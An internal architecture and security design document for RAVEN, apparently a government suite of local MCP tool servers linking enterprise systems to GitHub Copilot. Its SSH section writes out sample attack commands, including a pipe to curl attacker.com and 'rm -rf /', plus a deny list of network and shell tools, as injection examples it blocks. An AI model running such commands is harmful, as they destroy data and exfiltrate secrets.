# RAVEN — System Design & Architecture

## Security, Privacy, and Data Governance of MCP-Based AI Tooling

**Version:** 1.1  
**Date:** June 29, 2026  
**Author:** Connected Services BC — Epsilon Team (NR Sector Digital Services)  
**Classification:** UNCLASSIFIED — For Internal Distribution

---

> **Documentation map:** [`../README.md`](../README.md) = setup & usage · this document = architecture & security · [`../.github/copilot-instructions.md`](../.github/copilot-instructions.md) = AI-agent operating guide · [`TOOL_INVENTORY.md`](TOOL_INVENTORY.md) = source of truth for the server/tool catalog, read/write split, and env vars.

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [What Is MCP and Why It Matters for Security](#2-what-is-mcp-and-why-it-matters-for-security)
3. [System Architecture](#3-system-architecture)
4. [The AI Cannot Do What the Tools Do Not Allow](#4-the-ai-cannot-do-what-the-tools-do-not-allow)
5. [Complete Tool Inventory and Permissions](#5-complete-tool-inventory-and-permissions)
6. [Authentication and Credential Isolation](#6-authentication-and-credential-isolation)
7. [Personal Information Protection (FOIPPA Compliance)](#7-personal-information-protection-foippa-compliance)
8. [Zero Data Retention with GitHub Copilot Business](#8-zero-data-retention-with-github-copilot-business)
9. [Data Flow — End to End](#9-data-flow--end-to-end)
10. [Server Monitoring — SSH Security Controls](#10-server-monitoring--ssh-security-controls)
11. [What RAVEN Cannot Do — Explicit Boundaries](#11-what-raven-cannot-do--explicit-boundaries)
12. [Threat Model and Mitigations](#12-threat-model-and-mitigations)
13. [Compliance Summary](#13-compliance-summary)
14. [Appendix A — MCP Protocol Specification](#appendix-a--mcp-protocol-specification)
15. [Appendix B — Deployment Configuration](#appendix-b--deployment-configuration)
16. [Appendix C — GitHub Copilot Zero Data Retention Policy Reference](#appendix-c--github-copilot-zero-data-retention-policy-reference)

---

## 1. Executive Summary

RAVEN (Resource Analytics, Visibility & Enterprise Navigator) is a suite of locally-run MCP servers that connect BC Gov enterprise systems — Jira, Confluence, Bitbucket, Jenkins, and application servers — to AI assistants such as GitHub Copilot. It is designed with security as a primary concern.

**Key security properties:**

- **The AI can only do what the tools explicitly allow.** There are no open-ended system commands, no database access, and no arbitrary API calls. Each tool is a narrow, purpose-built function with validated parameters.
- **No data is retained by the AI.** Under a GitHub Copilot Business license with data exclusion enabled, prompts and responses are not stored, not used for training, and not logged by GitHub or any third party.
- **Personal information is scrubbed before it reaches the AI.** A FOIPPA-compliant PI scrubber replaces names, emails, phone numbers, IDIR usernames, SINs, and tokens with anonymized placeholders.
- **Credentials never leave the local machine.** Authentication tokens are held in process memory and attached to outbound HTTP requests. They are never included in MCP responses and never sent to the AI.
- **All server monitoring is read-only.** SSH commands are validated against an allowlist of safe, read-only binaries. Shell injection is structurally impossible.

This document provides a complete technical accounting of how these properties are enforced.

---

## 2. What Is MCP and Why It Matters for Security

### 2.1 The Model Context Protocol

MCP (Model Context Protocol) is an open standard created by Anthropic and adopted by the industry for connecting AI models to external tools. It defines a structured, typed interface between an AI client and a tool server.

**Crucially, MCP is not an open pipe.** It works like this:

```
┌──────────────────────┐          ┌──────────────────────┐
│   AI Client          │          │   MCP Server          │
│   (GitHub Copilot)   │          │   (RAVEN tool)        │
│                      │          │                       │
│  1. AI decides to    │  stdin   │  3. Server validates  │
│     call a tool      │ ──────► │     parameters via    │
│                      │          │     Zod schema        │
│  2. Client sends     │          │                       │
│     JSON-RPC with    │          │  4. Server executes   │
│     tool name +      │          │     the specific      │
│     parameters       │          │     operation         │
│                      │  stdout  │                       │
│  6. AI receives      │ ◄────── │  5. Server returns    │
│     text response    │          │     formatted text    │
└──────────────────────┘          └──────────────────────┘
```

### 2.2 Why This Matters

1. **The AI cannot invent tools.** It can only call tools that the MCP server has explicitly registered. If there is no "delete database" tool, the AI cannot delete a database. Period.

2. **Parameters are schema-validated.** Every tool defines a Zod schema specifying exactly which parameters are accepted, their types, and their constraints. Invalid parameters are rejected before execution.

3. **Responses are text-only.** The MCP server returns plain text (formatted as Markdown). There is no mechanism for returning executable code, binary data, or system commands.

4. **Transport is local stdio.** The MCP server runs as a child process on the developer's machine. Communication happens over stdin/stdout — there is no network listener, no open port, and no remote access.

### 2.3 What the AI Sees

When the AI connects to RAVEN, it receives a tool manifest — a list of available tools with their names, descriptions, and parameter schemas. This is the **complete boundary** of what the AI can do. The AI cannot:

- Call tools that are not in the manifest
- Pass parameters that do not match the schema
- Execute arbitrary system commands
- Access files, databases, or APIs outside of what the tools provide
- Modify the tools themselves

---

## 3. System Architecture

### 3.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Developer's Workstation                       │
│                                                                 │
│  ┌───────────────────┐    stdio    ┌──────────────────────┐     │
│  │ GitHub Copilot    │ ◄────────► │ Jira MCP Server      │     │
│  │ (AI Client)       │            └──────────┬───────────┘     │
│  │                   │                       │ HTTPS            │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ Confluence MCP Server│     │
│  │                   │            └──────────┬───────────┘     │
│  │                   │                       │ HTTPS            │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ Bitbucket MCP Server │     │
│  │                   │            └──────────┬───────────┘     │
│  │                   │                       │ HTTPS            │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ Server Monitor MCP   │     │
│  │                   │            └──────────┬───────────┘     │
│  │                   │                       │ SSH              │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ Overview MCP Server  │     │
│  │                   │            └──────────┬───────────┘     │
│  │                   │                       │ HTTPS            │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ Health MCP Server    │     │
│  │                   │            └──────────┬───────────┘     │
│  │                   │                       │ HTTPS            │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ Assets MCP Server    │     │
│  │                   │            └──────────┬───────────┘     │
│  │                   │                       │ HTTPS            │
│  │                   │    stdio    ┌─────────▼────────────┐     │
│  │                   │ ◄────────► │ IMIS MCP Server      │     │
│  └───────────────────┘            └──────────┬───────────┘     │
│                                              │ Local CSV        │
│  ┌────────────────────────────────────────┐                     │
│  │ ~/.raven/.env (credentials, local)     │                     │
│  │ Permissions: 600 (owner read/write)    │                     │
│  └────────────────────────────────────────┘                     │
└─────────────────────────────────────────────────────────────────┘
                          │ HTTPS / SSH
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│              BC Gov Internal Network (Behind VPN)                │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │ Jira Data    │  │ Confluence   │  │ Bitbucket    │          │
│  │ Center       │  │ Data Center  │  │ Data Center  │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │ INT Server   │  │ TEST Server  │  │ PROD Server  │          │
│  │ (int01)   │  │ (test01)     │  │ (prod01)     │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Key Architecture Decisions

| Decision | Rationale |
|----------|-----------|
| **Local-only execution** | MCP servers run as local processes — no cloud deployment, no exposed ports |
| **stdio transport** | No HTTP listeners, no WebSocket endpoints — eliminates remote attack surface |
| **Separate credential store** | `~/.raven/.env` with `chmod 600` — credentials never in code or MCP responses |
| **Per-tool schema validation** | Zod schemas enforce parameter types, ranges, and enums at the boundary |
| **PI scrubbing layer** | FOIPPA-compliant anonymization before data reaches the AI |
| **Read-only by default** | 121 of 181 locally-registered tools are read-only; 60 are writes. Jenkins and Artifactory writes include protected local transfers and guarded upstream mutations. See [TOOL_INVENTORY.md](TOOL_INVENTORY.md) for the authoritative split |
| **SSH command allowlist** | Server monitoring permits only a fixed set of read-only shell commands |

### 3.3 Package Structure

RAVEN is a TypeScript monorepo with 19 packages — 15 MCP servers plus the shared `auth` library, `pipeline` CLI, `server-ui`, and `raven-cli`:

```
packages/
  auth/                 # Shared: authentication, PI scrubbing, HTTP clients
  jira-mcp/             # Jira Data Center MCP server
  confluence-mcp/       # Confluence Data Center MCP server
  bitbucket-mcp/        # Bitbucket Data Center MCP server
  server-mcp/           # Application server monitoring (SSH)
  overview-mcp/         # Cross-system project overview
  health-mcp/           # Project health analytics
  assets-mcp/           # Jira Assets / CMDB
  imis-mcp/             # Infrastructure inventory (IMIS)
  raven-cli/            # CLI interface
  pipeline/             # Autonomous DevOps pipeline
  server-ui/            # Optional web dashboard
  sonar-mcp/            # SonarQube quality gate, measures, and local scans
  jenkins-mcp/          # Jenkins jobs, builds, queue, artifacts, promotions, and credentials
  ado-mcp/              # Azure DevOps Server (work items, repos, PRs, pipelines)
  bug-classifier-mcp/   # Bug pattern classifier
  jarvis-mcp/           # Jarvis application inventory (dynamic remote proxy)
  rfcbuddy-mcp/         # RFC Buddy (RFC search)
  artifactory-mcp/      # JFrog Artifactory artifacts, build-info, and guarded transfers
```

Every MCP server follows the same pattern:

```typescript
// index.ts — Entry point
loadEnv();                              // Read ~/.raven/.env
const server = createXxxServer();       // Register tools
const transport = new StdioServerTransport();
await server.connect(transport);        // Listen on stdin/stdout
```

---

## 4. The AI Cannot Do What the Tools Do Not Allow

This section directly addresses the core concern: **can the AI "go rogue" and perform unauthorized actions?**

### 4.1 The Tool Boundary Is Absolute

The MCP protocol enforces a strict contract:

1. **Tool registration is static.** When a server starts, it registers a fixed set of tools. These cannot be modified at runtime by the AI or by any external input.

2. **The AI can only call registered tools.** There is no `eval()`, no `exec()`, no arbitrary code execution path. The AI sends a JSON-RPC message with a tool name and parameters. If the tool name doesn't match a registered tool, the call is rejected.

3. **Parameters are validated before execution.** Every tool defines a Zod schema. For example, the `search_issues` tool accepts exactly two parameters:

   ```typescript
   server.tool(
     "search_issues",
     "Search Jira issues using JQL",
     {
       jql: z.string().describe("JQL query string"),
       maxResults: z.number().min(1).max(50).default(20)
     },
     handler
   );
   ```

   The AI cannot pass a SQL injection string where a number is expected. It cannot add extra parameters. The schema is the gatekeeper.

### 4.2 Dangerous Capabilities Are Excluded or Constrained

RAVEN excludes broad administrative and arbitrary-execution capabilities. The remaining high-impact operations are narrowly constrained:

| Action | Available? | Why Not |
|--------|-----------|---------|
| Delete a database | **No** | No database tools exist. There are no SQL connections. |
| Delete application-server files | **No** | SSH commands are allowlisted to read-only binaries only. Artifactory can delete one repository artifact only after exact-path and current SHA-256 confirmation. |
| Send data to arbitrary external URLs | **No** | Tools call only fixed, configured endpoints (§11.3), never URLs the AI chooses. (`jarvis-mcp` proxies to one such endpoint — the Jarvis API — not an arbitrary-URL capability.) |
| Execute arbitrary commands | **No** | No `exec` or `eval` tool exists. Server monitoring validates commands against an allowlist. |
| Access arbitrary local files | **No** | Artifactory uploads and downloads are confined to mode-restricted configured directories; paths cannot escape those roots. |
| Modify server configurations | **No** | Server monitor tools are strictly read-only. |
| Create user accounts | **No** | No user management tools exist. |
| Change permissions | **No** | No IAM or permission tools exist. |
| Access other systems | **No** | Tools connect only to fixed, configured endpoints: Jira, Confluence, Bitbucket, Jira Assets, Jenkins, application servers, and — when configured — Azure DevOps, SonarQube, Artifactory, RFC Buddy, and the Jarvis proxy (§11.3). |

### 4.3 Write Tools Are Narrow and Auditable

Of the 181 locally-registered tools, 60 are conservatively classified as writes (the rest are read-only). The table below is illustrative; see [TOOL_INVENTORY.md](TOOL_INVENTORY.md) for the complete read/write split. Jenkins config exports, Jenkins artifact downloads, and Artifactory downloads count as writes because they create protected local files.

| Tool | What It Does | What It Cannot Do |
|------|-------------|------------------|
| `create_issue` | Creates a Jira ticket | Cannot delete tickets, modify workflows, or change project settings |
| `update_issue` | Updates ticket fields | Cannot delete tickets or modify other users' permissions |
| `add_comment` | Adds a comment to a ticket | Cannot delete comments or modify existing ones |
| `transition_issue` | Moves a ticket between statuses | Limited to the workflow transitions available to the authenticated user |
| `create_page` | Creates a Confluence page | Cannot delete pages or modify space permissions |
| `update_page` | Updates page content | Cannot delete pages or access restricted spaces |
| `create_branch` | Creates a Git branch | Cannot delete branches or force-push |
| `create_pull_request` | Creates a PR | Cannot merge PRs, delete branches, or modify repository settings |
| `sonar_run_scan` | Runs the local sonar-scanner CLI | Cannot modify SonarQube server config; only submits an analysis report |
| `update_job_config` | Replaces Jenkins config.xml after an expected SHA-256 check | Cannot update a concurrently changed config; exact XML must come from the protected config directory |
| `create_credential` / `update_credential` | Stores a supported Jenkins credential using an environment/file secret reference | Cannot accept or return raw secret values through MCP arguments/responses |
| `trigger_build` / `stop_build` | Starts or interrupts Jenkins CI work | Cannot bypass Jenkins authorization; authentication redirects are rejected |
| `rfcbuddy_search_rfcs` | Searches and filters RFCs, advancing baseline tracking | Cannot modify upstream RFC ticket configurations or change schedule items |
| `artifactory_upload_artifact` / `artifactory_download_artifact` | Streams one file through protected local directories with incremental checksums | Cannot accept arbitrary local paths; downloads are staged exclusively and installed only after verification, and overwrite is disabled on Windows |
| `artifactory_copy_item` / `artifactory_move_item` | Dry-runs by default, then copies or moves an artifact after exact confirmation | Cannot choose another host or bypass Artifactory permissions |
| `artifactory_delete_item` | Deletes one file after exact-path and current SHA-256 confirmation | Refuses folders and stale/missing checksums |

Every write operation is subject to the **authenticated user's permissions** in the target system. If the user doesn't have permission to create issues in a Jira project, the tool call will fail — the MCP server cannot escalate privileges.

---

## 5. Complete Tool Inventory and Permissions

The complete, current tool inventory — every server, every tool, the read/write classification, and the per-server counts — is maintained as a single source of truth in **[TOOL_INVENTORY.md](TOOL_INVENTORY.md)**, verified against code. It replaces the hand-maintained tables that previously lived in this section, which had drifted out of sync with the tools actually registered.

**Summary as of this revision:** **15 MCP servers**; **181 tools registered locally** (121 read / 60 write); plus the `jarvis-mcp` dynamic proxy, which advertises ~6 additional tools from the remote Jarvis API (~5 read / 1 write) — see §11.3 for the data-egress note. Every upstream write operation runs under the **authenticated user's permissions** in the target system; the MCP server cannot escalate privileges. If the user lacks permission to perform an action, the tool call fails.

---

## 6. Authentication and Credential Isolation

### 6.1 Credential Storage

Credentials are stored in `~/.raven/.env` with restricted file permissions (`chmod 600`):

```
~/.raven/.env
├── ATLASSIAN_BASE_URL    (internal BC Gov URL)
├── ATLASSIAN_EMAIL       (user's gov.bc.ca email)
├── ATLASSIAN_PASSWORD    (user's IDIR password)
├── SERVER_A_PASSWORD     (SSH and sudo password for servers)
├── SONARQUBE_URL         (SonarQube base URL)
├── SONARQUBE_TOKEN       (SonarQube user token)
├── SONAR_SCANNER_BIN     (optional custom path to sonar-scanner)
├── ARTIFACTORY_URL       (HTTPS Artifactory base URL)
├── ARTIFACTORY_EMAIL     (user's gov.bc.ca email)
├── ARTIFACTORY_PASSWORD  (user's IDIR password)
├── RAVEN_ARTIFACTORY_*   (protected transfer directories and size limit)
├── JENKINS_URL           (Jenkins base URL)
├── JENKINS_USER          (optional dedicated Jenkins username)
├── JENKINS_TOKEN         (optional dedicated Jenkins API token)
├── RAVEN_JENKINS_*_DIR   (protected config, download, and secret directories)
└── RAVEN_SCRUB_PI        (PI scrubbing toggle)
```

### 6.2 How Credentials Flow (and Where They Don't)

```
~/.raven/.env
    │
    ▼
loadEnv()  →  process.env  →  SessionManager  →  HTTP Headers (Cookie / Authorization)
                                                          │
                                                          ▼
                                                   Jira / Confluence / Bitbucket
                                                   (BC Gov internal, HTTPS)
```

**Credentials are present in exactly two places:**

1. **The `.env` file on disk** (encrypted at rest via macOS FileVault)
2. **Process memory** (ephemeral, cleared when the MCP server exits)

**Credentials are absent from:**

- MCP tool responses (the AI never sees them)
- stdout/stderr output (would break MCP transport; `quiet: true` enforced)
- Log files (no logging of sensitive values)
- Network responses from Jira/Confluence/Bitbucket (credentials are in request headers, not response bodies)

### 6.3 Authentication Methods

RAVEN supports two authentication methods to BC Gov Atlassian systems:

| Method | When Used | Mechanism |
|--------|-----------|-----------|
| **Basic Auth** | When `ATLASSIAN_EMAIL` and `ATLASSIAN_PASSWORD` are set | HTTP `Authorization: Basic base64(email:password)` header |
| **SiteMinder SSO** | When Basic Auth credentials are not configured | `SMSESSION` cookie obtained via interactive browser login |

Both methods authenticate the **individual developer** — the MCP server operates with the same permissions as the user who configured it. There is no service account, no elevated privilege, and no shared credential.

### 6.4 Session Management

- **Session TTL:** 25 minutes (matches SiteMinder timeout)
- **Session cache:** `~/.workflow-suite/session.json` (local disk only, `chmod 600`)
- **Expiry detection:** HTTP 302 redirects to login pages are detected; session is refreshed automatically
- **No session sharing:** Each MCP server instance manages its own session

---

## 7. Personal Information Protection (FOIPPA Compliance)

### 7.1 The PI Scrubber

RAVEN includes a personal information scrubber (`PiScrubber`) that is applied to all data before it is returned to the AI. This ensures compliance with the BC Freedom of Information and Protection of Privacy Act (FOIPPA).

### 7.2 What Is Scrubbed

| Data Type | Pattern | Replacement |
|-----------|---------|-------------|
| Display names | Any person's name from Jira/Confluence | `Person-1`, `Person-2`, etc. (consistent within session) |
| Email addresses | `user@domain.tld` | `[EMAIL]` |
| Phone numbers | `(250) 555-1234`, `250-555-1234`, `+1-250-555-1234` | `[PHONE]` |
| IDIR usernames | `USER@IDIR`, `username=JSMITH` | `[IDIR]` |
| Social Insurance Numbers | `123-456-789`, `123 456 789` | `[SIN]` |
| Session tokens | `SMSESSION=abc123...` | `SMSESSION=[TOKEN]` |
| Bearer tokens | `Bearer eyJ...` | `Bearer [TOKEN]` |
| API keys/secrets | `api_key=abc123...` | `[CREDENTIAL]` |

### 7.3 Two-Layer Scrubbing

The scrubber applies two layers to every text field:

1. **Regex pattern matching** — catches PI by format (emails, phones, SINs, tokens)
2. **Known name replacement** — replaces previously seen display names, sorted by length (longest first) to prevent partial matches

### 7.4 Scrubbing Coverage

Every MCP server instantiates a `PiScrubber` and applies it consistently:

- **Jira:** Assignee names, reporter names, comment authors, description text, comment text
- **Confluence:** Page authors, last-modified-by names, page body content
- **Bitbucket:** PR authors, reviewer names, commit authors
- **Overview:** All fields from all three systems
- **Health:** All person references in health analysis output
- **Assets:** Object attribute values containing personal information
- **Server Monitor:** No PI expected in logs/configs, but credential patterns are scrubbed

### 7.5 Enabling PI Scrubbing

PI scrubbing is controlled by the `RAVEN_SCRUB_PI` environment variable in `~/.raven/.env`:

```env
RAVEN_SCRUB_PI=true
```

When set to `true` or `1`, all scrubbing is active. When unset or any other value, scrubbing is bypassed (pass-through mode for local-only LLMs where FOIPPA does not apply).

---

## 8. Zero Data Retention with GitHub Copilot Business

### 8.1 GitHub Copilot Business Data Handling Policy

When RAVEN is used with a **GitHub Copilot Business** (or Enterprise) license with data exclusion enabled, GitHub provides the following contractual guarantees:

| Property | Guarantee |
|----------|-----------|
| **Prompt retention** | Prompts are **not retained** after the response is delivered |
| **Response retention** | Responses are **not retained** after delivery |
| **Training exclusion** | Code, prompts, and responses are **not used to train** GitHub Copilot models or any other models |
| **Telemetry** | Only aggregated, non-identifiable usage metrics (e.g., acceptance rates) are collected |
| **Data residency** | Prompts are processed in transit and discarded — no persistent storage |

Source: [GitHub Copilot Trust Center](https://resources.github.com/copilot-trust-center/) and the GitHub Customer Agreement.

### 8.2 What This Means for RAVEN

The data flow when using RAVEN with GitHub Copilot Business is:

```
1. Developer asks a question in Copilot Chat
2. Copilot decides to call a RAVEN MCP tool
3. MCP tool runs LOCALLY — fetches data from Jira/Confluence/Bitbucket
4. PI scrubber anonymizes personal information
5. Scrubbed data is returned to Copilot via stdio (local process)
6. Copilot sends the scrubbed data + prompt to the LLM backend for processing
7. LLM generates a response
8. Response is returned to the developer
9. Prompt + response are DISCARDED — not stored, not logged, not used for training
```

**Combined with PI scrubbing, this means:**

- Even in the transient moment when data is processed by the LLM, personal information has already been replaced with anonymized placeholders
- After the response is delivered, nothing persists — not the prompt, not the tool outputs, not the AI response
- There is no database, no log, no archive where this data could later be retrieved

### 8.3 Comparison with Other Deployment Models

| Deployment | Data Retention | PI Risk | FOIPPA Compliance |
|-----------|---------------|---------|-------------------|
| **RAVEN + Copilot Business (data exclusion on)** | Zero retention | Minimal (PI scrubbed) | Compliant |
| **RAVEN + Local LLM (e.g., LM Studio)** | Zero (all local) | None (no cloud) | Compliant |
| **RAVEN + Copilot Individual** | Prompts may be retained | Moderate (PI scrubbed) | Requires review |
| **Manual copy-paste into ChatGPT** | Retained by OpenAI | High (no scrubbing) | Non-compliant |

RAVEN with GitHub Copilot Business provides strictly better privacy than any manual alternative.

---

## 9. Data Flow — End to End

### 9.1 Per-Request Lifecycle

```
┌──────────────────────────────────────────────────┐
│ Step 1: User Request                              │
│ "What are the open bugs in project DEMO?"      │
└──────────────────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 2: AI Decides to Call a Tool                 │
│ Tool: search_issues                               │
│ Params: { jql: "project=DEMO AND type=Bug      │
│           AND status!=Done", maxResults: 20 }     │
└──────────────────────────────────────────────────┘
                        │ (JSON-RPC over stdin)
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 3: Parameter Validation (Zod)                │
│ ✓ jql is a string                                 │
│ ✓ maxResults is a number between 1 and 50         │
└──────────────────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 4: Authentication                            │
│ SessionManager retrieves SMSESSION from memory    │
│ Creates authenticated HTTP request                │
│ Credentials stay in HTTP headers — never in       │
│ tool response                                     │
└──────────────────────────────────────────────────┘
                        │ (HTTPS to BC Gov Jira)
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 5: API Call                                  │
│ GET /rest/api/2/search?jql=...                    │
│ Cookie: SMSESSION=<token>                         │
│ Returns: JSON with issue data                     │
└──────────────────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 6: Response Processing                       │
│ • PI Scrubber: "Jane Smith" → "Person-1"          │
│ • PI Scrubber: "john@gov.bc.ca" → "[EMAIL]"       │
│ • Relevance scoring and ranking                   │
│ • Format as Markdown text                         │
│ • Content truncation (prevent context overflow)   │
└──────────────────────────────────────────────────┘
                        │ (MCP text response over stdout)
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 7: AI Receives Scrubbed Text                 │
│ "Person-1 reported: NullPointerException in..."   │
│ No credentials, no PII, no tokens                 │
└──────────────────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────┐
│ Step 8: AI Generates Response                     │
│ Summarizes the bugs for the developer             │
│ Under Copilot Business: prompt+response discarded │
└──────────────────────────────────────────────────┘
```

### 9.2 Credential Isolation Proof

At no point in this flow do credentials appear in the MCP response:

| Location | Contains Credentials? | Why |
|----------|----------------------|-----|
| `~/.raven/.env` | Yes | Source of truth, `chmod 600` |
| `process.env` | Yes | In-memory only, ephemeral |
| HTTP request headers | Yes | On the wire (TLS-encrypted) |
| HTTP response body | No | APIs return data, not auth tokens |
| MCP tool response | **No** | Only processed text |
| AI context window | **No** | Only sees tool response text |
| GitHub Copilot backend | **No** | Only sees scrubbed text, zero retention |

---

## 10. Server Monitoring — SSH Security Controls

Server monitoring tools SSH into BC Gov application servers to read logs and configurations. This is the most sensitive operation in RAVEN and has the strictest controls.

### 10.1 Command Allowlist

All SSH commands are validated against a strict allowlist of read-only binaries:

```
ALLOWED: grep, zgrep, zcat, cat, head, tail, readlink, basename,
         ls, df, du, wc, find, ps, stat, file, echo, date,
         hostname, uptime, free, vmstat, prtconf, rpm, mount
```

**Not allowed:** `rm`, `mv`, `cp`, `chmod`, `chown`, `kill`, `systemctl`, `service`, `dd`, `mkfs`, `fdisk`, `useradd`, `passwd`, `sudo` (except via controlled scripts), `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `python`, `perl`, `ruby`, `bash`, `sh`, `eval`, `exec`, or any other command not in the allowlist.

### 10.2 Shell Injection Prevention

Shell metacharacters are rejected outright:

```
BLOCKED: ; & | ` $ ( ) { } \ < >
```

This means the following attack vectors are structurally impossible:

| Attack | Example | Blocked By |
|--------|---------|-----------|
| Command chaining | `grep error; rm -rf /` | `;` blocked |
| Pipe injection | `grep error \| curl attacker.com` | `\|` blocked |
| Command substitution | `grep $(whoami)` | `$` and `()` blocked |
| Backtick execution | `` grep `id` `` | `` ` `` blocked |
| Redirect/overwrite | `grep error > /etc/passwd` | `>` blocked |
| Background execution | `grep error & rm -rf /` | `&` blocked |

### 10.3 Path Traversal Prevention

File paths are validated:

- Must be absolute (start with `/`)
- No `..` components allowed
- No shell metacharacters in paths

### 10.4 Execution Constraints

| Constraint | Value | Purpose |
|-----------|-------|---------|
| Command timeout | 60 seconds | Prevents hung processes |
| Output buffer | 2 MB max | Prevents memory exhaustion |
| Credential passing | Environment variables only | Never in command-line arguments (would be visible in `ps`) |

---

## 11. What RAVEN Cannot Do — Explicit Boundaries

To address specific fears directly:

### 11.1 "Can the AI delete a database?"

**No.** RAVEN has no database tools. There are no SQL connections, no ORM, no database client libraries. The `oracledb` dependency in the root `package.json` is used only by standalone analysis scripts (not MCP tools). No MCP server imports or uses it.

### 11.2 "Can the AI steal sensitive information?"

RAVEN does not expose arbitrary HTTP or filesystem access. Tool output passes through the PI scrubber before the AI sees it. The Artifactory MCP is the deliberate exception for file transfer: it may read or write only beneath configured, mode-restricted transfer directories and may send uploads only to the configured internal HTTPS Artifactory endpoint. Direct downloads may follow bounded HTTPS redirects only to the configured Artifactory context or exact storage hostnames in `RAVEN_ARTIFACTORY_DOWNLOAD_REDIRECT_HOSTS`; external storage requests receive no Artifactory credentials.

### 11.3 "Can the AI send data to a remote location?"

**Not to an arbitrary one.** MCP tools define the complete set of network operations available; there is no `fetch()` tool, no `curl` tool, and no general HTTP-client tool the AI can point at a URL of its choosing. RAVEN tools communicate only with these fixed, configured endpoints:

- BC Gov Jira / Confluence / Bitbucket Data Center (internal HTTPS)
- BC Gov Jira Assets / Insight CMDB (internal HTTPS)
- BC Gov application servers (internal SSH via VPN)
- Jenkins (`JENKINS_URL` / `JENKINS_BASE_URL`), on-prem Azure DevOps Server (`ADO_BASE_URL`), SonarQube (`SONARQUBE_URL`), JFrog Artifactory (`ARTIFACTORY_URL`), and RFC Buddy (`RFCBUDDY_URL`), when configured
- HTTPS object-storage hosts explicitly allowlisted for Artifactory direct downloads (`RAVEN_ARTIFACTORY_DOWNLOAD_REDIRECT_HOSTS`); these receive no Raven credentials
- **The Jarvis application-inventory API** (`JARVIS_BASE_URL`, default `https://jarvis-api.example.gov.bc.ca/mcp`). `jarvis-mcp` is a dynamic proxy: any Jarvis tool call is forwarded to this BC Gov–hosted endpoint with a Personal Access Token. Unlike the other servers, which implement a fixed set of tools locally against the systems above, `jarvis-mcp` forwards opaque MCP requests to a remote MCP endpoint — its tool surface is defined remotely. That makes it the most relevant server to the "local-only" framing and to FOIPPA / data-residency review. It still cannot reach arbitrary URLs: the destination is fixed by configuration, not chosen by the AI.

The AI cannot instruct RAVEN to phone home to an unconfigured host, exfiltrate data to an attacker-controlled URL, or communicate with any system not explicitly programmed into a tool.

### 11.4 "Can the AI modify production servers?"

**No.** Server monitoring tools are strictly read-only. The SSH command allowlist permits only read commands (`grep`, `cat`, `ls`, `ps`, etc.). Destructive commands (`rm`, `kill`, `systemctl`) are not in the allowlist and cannot be executed.

### 11.5 "Can the AI access systems it shouldn't?"

**No.** RAVEN operates with the authenticated user's permissions. If the user doesn't have access to a Jira project, neither does the AI. There is no privilege escalation, no service account with broad access, and no administrative override.

### 11.6 "Can the AI be tricked into doing something dangerous?"

The MCP protocol architecture makes this structurally difficult:

1. **Tool parameters are schema-validated.** Even if the AI is "tricked" by a prompt injection, the parameters still must conform to the Zod schema. You cannot inject SQL through a parameter that accepts only an enum value.

2. **Tools have fixed behavior.** The `search_issues` tool always calls the Jira search API. It cannot be redirected to call a different API or perform a different operation, regardless of what the AI "wants."

3. **The AI cannot create new tools.** The tool manifest is fixed at server startup. No amount of prompt engineering can add capabilities that don't exist.

---

## 12. Threat Model and Mitigations

| Threat | Likelihood | Impact | Mitigation |
|--------|-----------|--------|-----------|
| **AI calls a destructive tool incorrectly** | Low | High | Artifactory copy/move default to dry-run; live operations require exact confirmation; deletion additionally requires the current SHA-256 and refuses folders |
| **Credential leakage via tool response** | Very Low | High | Credentials are in HTTP headers, never in response text; `quiet: true` prevents env output |
| **PI leakage to AI provider** | Low | Medium | PI scrubber anonymizes all personal data; Copilot Business has zero retention |
| **SSH command injection** | Impossible | N/A | Command allowlist + shell metacharacter rejection makes injection structurally impossible |
| **Path traversal on servers** | Impossible | N/A | Paths validated: must be absolute, no `..`, no metacharacters |
| **Unauthorized system access** | Very Low | Medium | Uses authenticated user's permissions; no privilege escalation |
| **Session token theft** | Low | Medium | Tokens stored in memory with 25-min TTL; disk cache at `chmod 600` |
| **Prompt injection via tool output** | Low | Low | Tool responses are treated as untrusted content by the AI client; no code execution path |
| **Data exfiltration by AI** | Very Low | High | No arbitrary destination tools; Artifactory upload reads only from a protected directory and sends only to the configured internal HTTPS endpoint |
| **Malicious tool modification** | Very Low | High | Tools are compiled TypeScript; source is code-reviewed; no runtime modification |

---

## 13. Compliance Summary

| Requirement | How RAVEN Complies |
|-------------|-------------------|
| **FOIPPA s.30 (Protection of PI)** | PI scrubber anonymizes personal information before it reaches the AI. `RAVEN_SCRUB_PI=true` controls this globally. |
| **FOIPPA s.30.1 (Storage in Canada)** | All enterprise data stays on BC Gov infrastructure. MCP servers run locally. GitHub Copilot Business does not retain data. |
| **BC Gov ISP (Information Security Policy)** | Credentials stored with restricted permissions (`chmod 600`). Authentication via SiteMinder SSO or Basic Auth. TLS for all network communication. |
| **OWASP Top 10 — Injection** | Zod schema validation on all tool parameters. SSH command allowlist prevents shell injection. |
| **OWASP Top 10 — Broken Access Control** | All operations use the authenticated user's permissions. No privilege escalation. |
